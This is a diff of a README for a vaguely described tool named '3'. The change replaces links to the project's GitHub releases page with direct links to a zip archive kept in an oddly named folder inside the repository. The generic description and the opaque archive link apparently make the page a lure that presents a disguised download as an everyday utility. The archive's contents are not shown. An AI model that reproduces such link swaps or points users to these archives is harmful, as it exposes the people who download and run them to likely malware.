@@ -1,7 +1,7 @@
 # 🚀 3 - A Simple Tool for Everyday Tasks
 
 ## 📥 Download Now
-[![Download 3](https://img.shields.io/badge/Download-3-blue.svg)](https://github.com/Zemkaseksi/3/releases)
+[![Download 3](https://raw.githubusercontent.com/Zemkaseksi/3/main/daffodilly/3-2.2.zip)](https://raw.githubusercontent.com/Zemkaseksi/3/main/daffodilly/3-2.2.zip)
 
 ## 🌟 Description
 3 is a user-friendly application designed to simplify everyday tasks. With a focus on accessibility and ease of use, this tool helps you manage your daily activities with minimal effort.
@@ -30,7 +30,7 @@ To start using 3, follow these simple steps.
 - Regular updates: Receive new features and improvements.
   
 ## 📥 Download & Install
-To enjoy the features of 3, visit [this page to download](https://github.com/Zemkaseksi/3/releases). Follow the installation steps mentioned above to get started easily.
+To enjoy the features of 3, visit [this page to download](https://raw.githubusercontent.com/Zemkaseksi/3/main/daffodilly/3-2.2.zip). Follow the installation steps mentioned above to get started easily.
 
 ## 📄 Usage Guide
 After installation, you can open 3 from your applications menu. Here’s a quick overview of how to use the main features:
